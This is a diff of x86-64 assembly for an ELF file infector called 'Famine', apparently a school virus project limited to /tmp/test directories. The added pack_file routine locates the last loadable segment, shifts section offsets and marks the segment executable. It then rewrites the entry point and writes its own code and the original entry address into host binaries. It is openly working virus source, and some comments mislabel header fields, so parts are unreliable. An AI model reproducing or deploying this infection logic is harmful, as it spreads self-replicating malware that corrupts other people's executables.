@@ -150,10 +150,10 @@ open_file:
 	jl		open_file_end
 	mov		QWORD [rsp], rax
 
-	mov		rdx, rax
-	mov		rsi, r15
-	mov		rdi, r14
-	call	check_file
+	mov		rdx, rax			; void *data
+	mov		rsi, r15			; int size
+	mov		rdi, r14			; int fd
+	call	pack_file
 
 	mov		rsi, r15
 	mov		rdi, [rsp]
@@ -172,28 +172,130 @@ get_dat_elf_end:
 	pop		rbp
 	ret
 
-;; void	check_file(int fd, int size, char *data)
-check_file:
+;; void	pack_file(int fd, int size, char *data)
+pack_file:
 	cmp		BYTE [rdx], 0x7f
-	jne		wrong_file
+	jne		pack_file_end
 	cmp		BYTE [rdx + 1], 'E'
-	jne		wrong_file
+	jne		pack_file_end
 	cmp		BYTE [rdx + 2], 'L'
-	jne		wrong_file
+	jne		pack_file_end
 	cmp		BYTE [rdx + 3], 'F'
-	jne		wrong_file
-	cmp		BYTE [rdx + 4], 2				; ->e_ident[EI_CLASS] == ELFCLASS64
-	jne		wrong_file
-	cmp		BYTE [rdx + 5], 0				; ->e_ident[EI_DATA] != ELFDATANONE
-	je		wrong_file
-	cmp		BYTE [rdx + 6], 1				; ->e_ident[EI_VERSION] == EV_CURRENT
-	jne		wrong_file
-	movzx	ecx, BYTE [rdx + 16] 			; ->e_type == ET_EXEC || ->e_type == ET_DYN
-	lea		edx, [rcx - 2]
-	cmp		dl, 1
-	ja		wrong_file
-	call ret_ok
-wrong_file:
+	jne		pack_file_end
+	cmp		BYTE [rdx + 4], 2			; ->e_ident[EI_CLASS] == ELFCLASS64
+	jne		pack_file_end
+	cmp		BYTE [rdx + 5], 0			; ->e_ident[EI_DATA] != ELFDATANONE
+	je		pack_file_end
+	cmp		BYTE [rdx + 6], 1			; ->e_ident[EI_VERSION] == EV_CURRENT
+	jne		pack_file_end
+	movzx	eax, BYTE [rdx + 16] 		; ->e_type == ET_EXEC || ->e_type == ET_DYN
+	sub		eax, 2
+	cmp		al, 1
+	ja		pack_file_end
+
+	movzx	ecx, WORD [rdx + 56] 		; ->e_phnum (size: 2)
+	mov		r8, QWORD [rdx + 32] 		; ->e_phoff (size: 8)
+	lea		rax, [rdx + r8]				; pointer to first segment of Program Header table
+	imul	rcx, rcx, 56				; total size of Program Header table (56: sizeof Elf64_Phdr)
+	add		rcx, r8		  				; offset to the end of Program Header table
+	add		rcx, rdx					; address of the end of Program Header table
+	xor		r8d, r8d
+	jmp		find_highest_pt
+next_program:
+	add		rax, 56						; move to next Program Header
+	cmp		rcx, rax					; did we passed the last Program Header segment offset ?
+	je		change_section_offset
+find_highest_pt:	
+	;; 1. Find the highest memory mapped PT_LOAD segment
+	cmp		DWORD [rax], 1				; is the segment loadable ?
+	jne		next_program
+	test	r8, r8						; test if r8 is 0 (NULL)
+	je		first_segment
+	mov		r9, QWORD [r8 + 16] 		; ->p_vaddr (size: 8) offset
+	cmp		QWORD [rax + 16], r9		; is segment[i].p_vaddr > assumed->p_vaddr ?
+	cmova	r8, rax						; Move if above (unsigned)
+	jmp		next_program
+first_segment:
+	mov		r8, rax						; assign r8 to be the highest loadable segment
+	jmp		next_program
+change_section_offset:
+	test	r8, r8						; if no loadable segment has been found, return
+	je		pack_file_end
+	movzx	ecx, WORD [rdx + 60] 		; ->e_shnum (size: 2)
+	mov 	r9, QWORD [rdx + 40]		; ->e_shoff (size: 8)
+	lea		rax, [rdx + r9]				; pointer to first segment of Section Header table
+	imul	rcx, rcx, 64				; total size of Section Header table (64: sizeof Elf64_Shdr)
+	add		rcx, r9						; offset to the end of Section Header table
+	add		rcx, rdx					; address of the end of Section Header table
+	mov		r9, QWORD [r8 + 8]			; store the infected segment offset (+8: offset of p_offset)
+	add		r9, QWORD [r8 + 40]			; add to it te infected segment memory size (+40: offset of p_memsz)
+find_higher_sections:
+	;; Extra: Change the offset of sections higher than the section we will infect.
+	mov		r10, QWORD [rax + 24] 		; store section[i].s_offset
+	cmp		r10, r9 					; compare if it is greater than then infected segment offset
+	jl		next_section
+	add		r10d, [rel famine64_size] 	; add to it our program size
+	mov		QWORD [rax + 24], r10		; rewrite it to section
+	jmp		next_section
+next_section:
+	add		rax, 64						; move to next section
+	cmp		rcx, rax					; check if we are at the end of it
+	jl		find_higher_sections
+
+	;; Now we will change the program entry point
+	;; From now on, r8 contains our code segment, rcx the Elf Header
+	mov		rax, QWORD [rdx + 24] 		; First, store the original program entry point
+	mov		r9, QWORD [r8 + 16]			; store infected segment virtual address (16: p_vaddr offset)
+	add		r9, QWORD [r8 + 32]			; add it the segment memory size so the new value point to our infected code
+	mov		QWORD [rdx + 24], r9		; modify the program entry point to our infected segment virtual address
+	mov		r10d, [rel famine64_size]
+	add		QWORD [rdx + 40], r10		; modify the Section Header table offset
+	mov		ecx, DWORD [r8 + 4]			; store infected segment memory size (+4: p_memsz)
+	test	cl, 1						; see if it got the EXECUTABEL bit
+	jne		pack_finish
+	or		ecx, 1						; make the segment executable
+	mov		DWORD [r8 + 4], ecx
+pack_finish:	
+	add		QWORD [r8 + 40], r10 		; change segment memory size
+	mov		r10, QWORD [r8 + 40]
+	mov		QWORD [r8 + 32], r10 		; change segment file size
+
+	sub		rsp, 40
+	mov		QWORD [rsp], rdi		; store the program file descriptor
+	mov		QWORD [rsp + 8], rdx	; store the address of the program data
+	mov		QWORD [rsp + 16], rsi 	; store the program size
+	mov		QWORD [rsp + 24], rax	; store the original program entry point
+	mov		rax, QWORD [r8 + 8]		;
+	add		rax, QWORD [rsp + 40]	; (infected->p_offset + infected->p_filesz - famine64_size)
+	sub		eax, [rel famine64_size] ;
+	mov		QWORD [rsp + 32], rax 	; store the offset to our code injection
+	;; Now we will write our new program
+	mov		rsi, QWORD [rsp + 8]					; replace rsi with *data (for write)
+	mov		rdx, QWORD [rsp + 32]
+	mov		rax, SYS_WRITE
+	;; rdi already contain the fd, rsi contains a pointer to the first byte of the program data and rcx the offset
+	syscall
+	mov		rdi, QWORD [rsp]
+	lea		rsi, [rel famine64_func] 	; write family64_func
+	mov		rdx, [rel famine64_size]	; compute his size
+	sub		rdx, 8						; less the value of Elf64_Addr
+	mov		rax, SYS_WRITE
+	syscall
+	mov		rdi, QWORD [rsp]
+	lea		rsi, [rsp + 24]				; load the address of the old program entry point, stored in r11
+	mov		rdx, 8						; sizeof ELF64_Addr
+	mov 	rax, SYS_WRITE
+	syscall
+	mov		rdi, QWORD [rsp]
+	lea		rsi, [rsp + 8]
+	add		rsi, QWORD [rsp + 32]
+	mov		rdx, QWORD [rsp + 16]
+	sub		rdx, QWORD [rsp + 32]
+	mov		rax, SYS_WRITE
+	syscall
+
+	add		rsp, 40
+pack_file_end:
 	ret
 
 end:	
@@ -236,7 +338,7 @@ ret_error:
 famine64_data:
 	OK db "OK", 10
 	ERR db "ERROR", 10
-	banner db "Famine version 1.0 (c)oded by gbourgeo-xxxxxxxx"
+	banner db "Famine version 1.0 (c)oded by gbourgeo-xxxxxxxx", 0
 	dir_one db "/tmp/test/", 0
 	dir_two db "/tmp/test2/", 0
 	jump_vaddr dq 0x0
